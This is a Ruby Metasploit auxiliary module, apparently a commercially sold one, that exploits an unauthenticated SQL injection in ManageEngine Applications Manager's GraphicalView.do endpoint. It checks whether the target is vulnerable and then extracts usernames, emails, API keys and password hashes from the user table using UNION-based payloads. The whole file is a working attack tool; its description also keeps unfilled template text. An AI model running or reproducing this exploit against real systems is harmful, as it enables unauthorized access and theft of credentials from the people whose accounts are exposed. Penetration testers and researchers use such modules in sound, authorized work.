##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ManageEngine Applications Manager Unauthenticated Username/Password Hash Enumeration',
      'Description'    => %q{
    This module exploits an unauthenticated SQL injection in order to
    enumerate usernames and password hashes from the database.

    A longer description after the short description goes into more
    detail about the module, the vulnerbaility, or whatever information
    is useful to provide for documentation purposes.

    Categories: Enterprise

    Price: 4

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => ''
    ))

    register_options(
      [
        Opt::RPORT(9090),
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
      ], self.class)
  end

   def check
    left = Rex::Text.rand_text_alpha(8)
    right = Rex::Text.rand_text_alpha(8)
    flag = Rex::Text.rand_text_alpha(8)

    res = make_injected_request('UNION ALL SELECT '+str2chr(left+flag+right)+'--')

    f = $1 if res.body =~ /#{left}(.*)#{right}/

    if f == flag
      return Msf::Exploit::CheckCode::Vulnerable
    else
      return Msf::Exploit::CheckCode::Safe
    end
  end


  def run
    unless check == Msf::Exploit::CheckCode::Vulnerable
      fail_with(Failure::Unknown, 'Server not vulnerable')
    end

    left = Rex::Text.rand_text_alpha(8)
    right = Rex::Text.rand_text_alpha(8)

    res = make_injected_request("UNION ALL SELECT (#{str2chr(left)}||COALESCE(CAST(COUNT(*) AS CHARACTER(10000)),(CHR(32)))||#{str2chr(right)}) FROM public.am_userpasswordtable-- xPks")

    users_count = $1.to_i if res.body =~ /#{left}(.*?)#{right}/

    print_good("Found #{users_count} users")

    users = []
    0.upto(users_count - 1) do |i|
      res = make_injected_request("UNION ALL SELECT (SELECT (#{str2chr(left)})||COALESCE(CAST(apikey AS CHARACTER(10000)),(CHR(32)))||"+
                                  "(#{str2chr(right)})||COALESCE(CAST(emailid AS CHARACTER(10000)),(CHR(32)))||"+
                                  "(#{str2chr(left)})||COALESCE(CAST(password AS CHARACTER(10000)),(CHR(32)))||"+
                                  "(#{str2chr(left)})||COALESCE(CAST(restrictedadmin AS CHARACTER(10000)),(CHR(32)))||"+
                                  "(#{str2chr(right)})||COALESCE(CAST(userid AS CHARACTER(10000)),(CHR(32)))||"+
                                  "(#{str2chr(right)})||COALESCE(CAST(username AS CHARACTER(10000)),(CHR(32)))||"+
                                  "(#{str2chr(left)}) FROM public.am_userpasswordtable OFFSET #{i} LIMIT 1)-- SqLF")

      res.body =~ /#{left}(.*?)#{right}(.*?)#{left}(.*?)#{left}(.*?)#{right}(.*?)#{right}(.*?)#{left}/

      users << {
        'apikey' => $1,
        'emailid' => $2,
        'password' => $3,
        'restrictedadmin' => $4,
        'userid' => $5,
        'username' => $6
      }
    end
    path = store_loot('manage_engine_apps_manager.users', 'text/plain', datastore['RHOST'], users.to_json)
    print_good("Users saved to file #{path}")
  end

  def str2chr(str)
    ret = ''
    str.split('').each do|c|
      ret = ret + 'chr('+c.ord.to_s+')||'
    end

    return ret[0..-3]
  end


  def make_injected_request(sql)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'GraphicalView.do'),
      'vars_get' => {
        'haid' => '0 ' + sql,
        'method' => 'popUp',
        'isPopUp' => true
      }
    })
  end
end

